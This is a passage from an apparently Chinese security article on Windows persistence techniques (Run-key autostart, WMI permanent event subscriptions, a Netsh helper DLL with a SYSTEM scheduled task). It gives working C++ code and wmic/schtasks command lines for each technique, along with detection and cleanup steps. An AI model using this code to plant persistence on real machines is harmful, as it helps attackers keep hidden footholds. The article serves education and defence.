        DWORD resource_size  = NULL;
        LPVOID resource_pt = NULL;
        HGLOBAL h_resource_load = NULL;
        HANDLE save_file  = NULL;
        h_resource = FindResource(NULL, resource_name, resource_type);
        if (NULL == h_resource)
        {
            goto Error_Exit;
        }
        resource_size = SizeofResource(NULL, h_resource);
        if (0 >= resource_size)
        {
            goto Error_Exit;
        }
        h_resource_load = LoadResource(NULL, h_resource);
        if (NULL == h_resource_load)
        {
            goto Error_Exit;
        }
        resource_pt = LockResource(h_resource_load);
        if (NULL == resource_pt)
        {
            goto Error_Exit;
        }
        save_file = CreateFile(save_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(save_file == INVALID_HANDLE_VALUE)
        {
            goto Error_Exit;
        }
        for (DWORD i = 0; i 
    #include
    int main()
    {
        //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        HKEY hKey;
        DWORD dwDisposition;
        const char path[] = "C:\\HelloTopSec.exe";//hello.exe
        if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
        {
            return 0;
        }
        if (ERROR_SUCCESS != RegSetValueExA(hKey, "hello", 0, REG_SZ, (BYTE*)path, (1 + ::lstrlenA(path))))
        {
            return 0;
        }
        return 0;
    }
## **运行效果图**
在Startup目录的快捷方式会在系统启动的时候被执行
![
](https://images.seebug.org/content/images/2019/08/7a1e2ff4-9053-4659-b377-9bbd58bae151.png-w331s)
HelloTopSec.exe在系统启动的时候被执行
![
](https://images.seebug.org/content/images/2019/08/af86218b-4a67-479e-83a1-35aca2de283e.png-w331s)
## **检查及清除方法**
1、 检查所有位于Startup目录的快捷方式，删除有不明来源的快捷方式
2、 由于快捷方式的目标路径可能不会改变，因此对与已知软件更改，修补程序，删除等无关的快捷方式文件的修改都可能是可疑的。
3、 检查注册表项的更改。
# **WMI事件过滤**
## **原理及代码介绍**
Windows管理规范（Windows Management Instrumentation，缩写WMI）由一系列对Windows Driver
Model的扩展组成，它通过仪器组件提供信息和通知，提供了一个操作系统的接口。从攻击者或防御者的角度来看，WMI最强大的功能之一是WMI能够响应WMI事件。
除了少数例外，WMI事件可用于响应几乎任何操作系统事件。 例如，WMI事件可用于在进程创建时触发事件。
然后，可以将此机制用作在任何Windows操作系统上执行命令行指令。 有两类WMI事件，在单个进程的上下文中本地运行的事件和永久WMI事件过滤。
本地事件持续主机进程的生命周期，而永久WMI事件存储在WMI存储库中，以SYSTEM身份运行，并在重新引导后保持不变。据各安全厂商披露，有不少APT组织使用这种技术来维持后门持久性，如何防御WMI攻击值得安全研究人员进行了解。
WMI允许通过脚本语言(VBScript 或 Windows PowerShell)来管理本地或远程的Windows计算机或服务器，同样的,
微软还为WMI提供了一个称之为Windows Management Instrumentation Command-line（WMIC）的命令行界面，我们还可以通过WMIC工具来管理系统中的WMI。
![
](https://images.seebug.org/content/images/2019/08/1ac39be8-c41c-4531-ae50-6fe4223016f6.png-w331s)
WMI查询使用WMI查询语言（WQL），它是SQL的一个子集，具有较小的语义更改以支持WMI。WQL支持三种类型的查询，数据查询、架构查询及事件查询。消费者使用事件查询进行注册，以接收事件通知，事件提供程序则使用事件查询进行注册以支持一个或多个事件。
要安装永久WMI事件订阅，需要执行以下三步：
  1. 注册事件过滤器 – 也就是感兴趣的事件，或者说触发条件
  2. 注册事件消费者 – 指定触发事件时要执行的操作
  3. 绑定事件消费者和过滤器 – 将事件过滤器和事件消费者绑定，以在事件触发时执行指定操作。
如下的图是某样本通过PowerShell注册WMI永久事件过滤实现持久化的代码：
![
](https://images.seebug.org/content/images/2019/08/bf9e20d8-8264-4f26-82e5-c264a49c2a05.png-w331s)
如下的代码演示了如何通过利用WMIC工具注册WMI事件来实现后门持久化，
注册的事件会在系统启动时间120后收到通知，执行CMD命令调用Rundll32加载我们指定的DLL并执行其导出函数。
    BOOL add_wmi_filter()
    {
        BOOL    ret = FALSE;
        int     path_len = NULL;
        TCHAR*  command = NULL;
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(STARTUPINFO);
        si.wShowWindow = SW_HIDE;
        command = new TCHAR[MAXBYTE * 7];
        if (command == NULL)
        {
            goto ERROR_EXIT;
        }
        //添加一个 event filter
        wsprintf(command, _TEXT("cmd \/c \"wmic \/NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"TopsecEventFilter\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 20 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=120 AND TargetInstance.SystemUpTime < 150\"\""));
        if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
        {
            goto ERROR_EXIT;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        TerminateProcess(pi.hProcess, 0);
        //添加一个事件消费者
        wsprintf(command, _TEXT("cmd \/c \"wmic \/NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"TopsecConsumer\", ExecutablePath=\"C:\\Windows\\System32\\cmd.exe\",CommandLineTemplate=\" \/c Rundll32 C:\\topsec.dll RunProc\"\""));
        memset(&pi, 0, sizeof(pi));
        if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
        {
            goto ERROR_EXIT;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        TerminateProcess(pi.hProcess, 0);
        //绑定事件及消费者
        wsprintf(command, _TEXT("cmd \/c \"wmic \/NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"TopsecEventFilter\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"TopsecConsumer\\\"\"\""));
        memset(&pi, 0, sizeof(pi));
        if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
        {
            goto ERROR_EXIT;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        TerminateProcess(pi.hProcess, 0);
        ret = TRUE;
    ERROR_EXIT:
        if (command != NULL)
        {
            delete[] command;
            command = NULL;
        }
        return ret;
    }
有关事件查询的更多信息，可以查看微软在线帮助，[接收事件通知](https://docs.microsoft.com/en-us/windows/win32/wmisdk/receiving-event-notifications)。
有关WMI查询的更多信息，可以查看微软在线帮助，[使用WQL查询](https://docs.microsoft.com/en-us/windows/win32/wmisdk/querying-with-wql)。
关于WMI攻防的更多信息， 也可以参考FireEye发布的白皮书，《[WINDOWS MANAGEMENT INSTRUMENTATION (WMI)
OFFENSE, DEFENSE, AND FORENSICS](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)》。
## **运行效果图**
运行该程序后，会在系统中安装WMI事件，使用AutoRun工具查看WMI相关的数据
![
](https://images.seebug.org/content/images/2019/08/17f05e28-e9d7-4646-a6f5-0ef8f256e843.png-w331s)
重启电脑，等系统运行时长超过120秒后，触发事件，我们设定的命令被执行
![
](https://images.seebug.org/content/images/2019/08/e09c6107-93b4-4de1-abd2-a7aad8a18e33.png-w331s)
## **检查及清除方法**
1、 使用AutoRuns工具检查WMI 订阅，并删除不明来源的事件订阅，可通过与已知良好的常规主机进行对比的方式，来确认事件订阅是否为不明来源。
# **Netsh Helper DLL**
## **原理及代码介绍**
Netsh.exe（也称为Netshell）是一个命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加辅助DLL以扩展实用程序功能的功能，
使用“netsh add helper”即可注册新的扩展DLL，注册扩展DLL后，在启动Netsh的时候便会加载我们指定的DLL。注册的Netsh
Helper DLL的路径会保存到Windows注册表中的HKLM\SOFTWARE\Microsoft\Netsh路径下。
![
](https://images.seebug.org/content/images/2019/08/ea50ca5b-ad8f-4824-8883-c6adfbe582ea.png-w331s)
当使用另一种持久性技术自动执行netsh.exe时，攻击者可以使用带有Helper DLL的Netsh.exe以持久方式代理执行任意代码。
计划任务程序是Microsoft Windows的一个组件，它提供了在预定义时间或指定时间间隔之后安排程序或脚本启动的功能，
也称为作业调度或任务调度。系统中的schtasks.exe用于管理计划任务，允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任务。如从计划表中添加和删除任务，按需要启动和停止任务，显示和更改计划任务。
![
](https://images.seebug.org/content/images/2019/08/60abfbc7-113c-464f-812c-3358746a5c65.png-w331s)
如下的代码演示了攻击者如何通过在Netsh命令添加Helper DLL并通过调用schtasks程序来新建计划任务，实现代码持久化的目的。
    BOOL add_to_netsh_helper(LPCTSTR dll_path)
    {
        BOOL    ret = FALSE;
        int     path_len = NULL;
        TCHAR*  command = NULL;
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(STARTUPINFO);
        path_len = _tcslen(dll_path);
        command = new TCHAR[(path_len * sizeof(TCHAR) +  sizeof(TCHAR)) * 2];
        //添加netsh helper
        wsprintf(command, _TEXT("cmd \/c \"netsh add helper %s\""), dll_path);
        if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
        {
            goto ERROR_EXIT;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
        memset(&pi, 0, sizeof(pi));
        //添加netsh主程序到计划任务
        wsprintf(command, _TEXT("cmd \/c \"schtasks.exe \/create \/tn \"init\" \/ru SYSTEM \/sc ONSTART \/tr \"C:\\windows\\system32\\netsh.exe\"\""));
        if(!CreateProcess(NULL, command, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi))
        {
            goto ERROR_EXIT;
        }
        WaitForSingleObject(pi.hProcess, INFINITE);
    ret = TRUE;
    ERROR_EXIT:
        if (command != NULL)
        {
            delete[] command;
            command = NULL;
        }
        return ret;
    }
其中Netsh Helper DLL需要导出一个函数供 Netsh调用，导出函数原型及关键代码如下：
    BOOL APIENTRY DllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved
                         )
    {
        switch (ul_reason_for_call)
        {
        case DLL_PROCESS_ATTACH:
            OutputDebugString(_TEXT("Load DLL~~"));
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
        }
        return TRUE;
    }
    DWORD _stdcall NewThreadProc(LPVOID lpParam)
    {
        while (TRUE)
        {
            OutputDebugString(_TEXT("Netsh Helper, Hello Topsec"));
        }
        return 0;
    }
    extern "C" DWORD  _stdcall InitHelperDll(DWORD dwNetshVersion, PVOID Reserved)
    {
        CreateThread(NULL, NULL, NewThreadProc, NULL, NULL, NULL);
        MessageBox(NULL, _TEXT("Netsh Helper, Hello Topsec"), NULL, MB_OK);
        return NO_ERROR;
    }
## **运行效果图**
上面的代码首先添加Netsh Helper DLL，然后添加计划任务，在系统启动的时候启动Netsh。 计算机重启后效果如图：
![
](https://images.seebug.org/content/images/2019/08/4441b7e8-08ab-4a57-a22f-6d30aedba628.png-w331s)
![
](https://images.seebug.org/content/images/2019/08/c237eeef-9533-44d3-a59c-a878901b22e8.png-w331s)
运行后的注册表键值情况如下图所示：
## **检查及清除方法**
1、检查注册表路径HKLM\SOFTWARE\Microsoft\Netsh，查看是否有不明来源的Helper DLL注册信息并删除。
# **总结**
以上就是持久化攻击的全部内容了，通过本文总结的这些攻击手段可以看出，有的虽老生常谈，却不可忽视，有的设计很巧妙，令人受益匪浅。它们好像无孔不入，所有的攻击都是为了更隐蔽，更持久的运行。当然，这肯定不是MITRE
ATT&CK?上的所有内容，更不是攻击者的所有手段，一定会有一些攻击手段尚未被发现。想象着，当攻击者不断获取着系统上的信息，而你却不自知时，这是多么可怕！作为安全工作者，我们不应满足于现状，更应该拥有好奇心和创造力，去发现未知的安全隐患。
本文到此就结束了，接下来会根据MITRE ATT&CK出一系列类似的文章，敬请期待！
* * *